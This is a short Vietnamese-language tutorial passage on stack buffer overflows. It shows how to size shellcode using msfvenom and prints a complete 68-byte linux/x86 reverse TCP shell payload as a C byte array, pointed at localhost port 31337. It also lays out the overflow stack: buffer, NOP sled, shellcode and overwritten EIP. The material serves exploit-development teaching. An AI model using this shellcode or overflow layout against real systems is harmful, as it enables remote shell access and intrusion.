# Determine the Length for Shellcode
---
## Shellcode - Length
Sử dụng **msfvenom**  để tìm hiểu xem shellcode mà chúng ta sẽ chèn sẽ lớn đến mức nào và để làm được điều này.
```shell
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00"
"\x01\x68\x02\x00\x7a\x69\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Payload sẽ vào khoảng 68 bytes. Chúng ta nên lấy rộng hơn để tránh trường hợp xấu hơn.

Thông thường, có thể hữu ích khi chèn một số lệnh không thao tác (NOPS) trước khi shellcode của chúng ta bắt đầu để nó có thể được thực thi một cách rõ ràng.

```shell
Offset = Buffer + EIP = 1036 + 4 = 1040 bytes
NOPS = "\x90" * 100
Shellcode = "\x44" * 150

Stack = EIP (4) + Shellcode (150) + NOPS (100) + Buffer(1040 - 100 - 150 - 4) 
```
```
+--+--------+------+-----------+---------+-------+
|  | Buffer | NOPS | ShellCode | EIP     | Stack |
+==+========+======+===========+=========+=======+
|  |        |      |    EBP    |         |       |
+--+--------+------+-----------+---------+-------+
|  |         1036 Bytes        | 4 Bytes |       |
+--+---------------------------+---------+-------+
```

**MAXSHELLCODE = 250**